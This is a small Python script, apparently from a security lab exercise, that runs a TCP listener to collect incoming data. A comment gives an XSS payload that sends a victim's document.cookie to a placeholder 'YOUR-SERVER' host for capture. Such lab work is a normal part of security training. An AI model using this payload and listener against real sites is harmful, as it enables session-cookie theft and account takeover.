import socket
#this is for the lab Offline password cracking
def start_listening_server(host='0.0.0.0', port=8080):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen(5)
        print(f"Listening on {host}:{port}...")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Connection received from {client_address}")
            data = client_socket.recv(1024)
            print(f"Received data: {data.decode(errors='ignore')}")
            #client_socket.sendall(b"Hello! You are connected to the server.\n")
            client_socket.close()

    except KeyboardInterrupt:
        print("\nServer shutting down.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        server_socket.close()

if __name__ == "__main__":
    start_listening_server()
    
    
'''
the xss payload would be something like this:  
    <script>
    document.location='//YOUR-SERVER/'+document.cookie
    </script>
this will send the cookie to your server, and you can use the listening server to capture it. 
'''
#the exploit server was already provided in the lab, so you can use that to capture the cookie.